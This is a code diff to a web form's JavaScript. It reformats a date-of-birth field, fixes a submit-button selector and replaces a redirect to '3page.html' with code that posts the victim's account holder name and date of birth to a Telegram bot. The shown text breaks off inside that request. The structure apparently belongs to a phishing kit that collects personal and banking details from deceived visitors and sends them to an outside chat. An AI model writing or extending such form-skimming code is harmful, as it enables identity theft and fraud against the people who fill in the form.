@@ -1,15 +1,17 @@
 // Function to format DOB input with slashes and validate the date
 document.getElementById('dob').addEventListener('input', function(event) {
-    let input = event.target.value.replace(/\D/g, '').slice(0, 8); // Remove non-digits and limit length to 8
+    let input = event.target.value.replace(/\D/g, ''); // Remove non-digits
     let formatted = '';
 
     // Format input with slashes
+    if (input.length >= 2) {
+        formatted += input.slice(0, 2) + '/';
+    }
+    if (input.length >= 4) {
+        formatted += input.slice(2, 4) + '/';
+    }
     if (input.length > 4) {
-        formatted = `${input.slice(0, 2)}/${input.slice(2, 4)}/${input.slice(4)}`;
-    } else if (input.length > 2) {
-        formatted = `${input.slice(0, 2)}/${input.slice(2)}`;
-    } else {
-        formatted = input;
+        formatted += input.slice(4, 8);
     }
 
     // Update the input field value
@@ -33,7 +35,7 @@ document.getElementById('dob').addEventListener('input', function(event) {
 });
 
 // Event listener for form submission
-document.querySelector('button[type="2submit"]').addEventListener('click', function(event) {
+document.querySelector('button[type="submit"]').addEventListener('click', function(event) {
     event.preventDefault();
 
     // Validate form fields
@@ -58,7 +60,18 @@ document.querySelector('button[type="2submit"]').addEventListener('click', funct
         return;
     }
 
-    // Redirect to 3page.html after validation
-    window.location.href = '3page.html';
-});
-    
+    // Telegram Bot API details
+    const botToken = 'YOUR_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    // Message to send
+    const message = `Account Holder Name: ${accountHolderName}\nDate of Birth: ${dob}`;
+
+    // Send data to Telegram bot
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
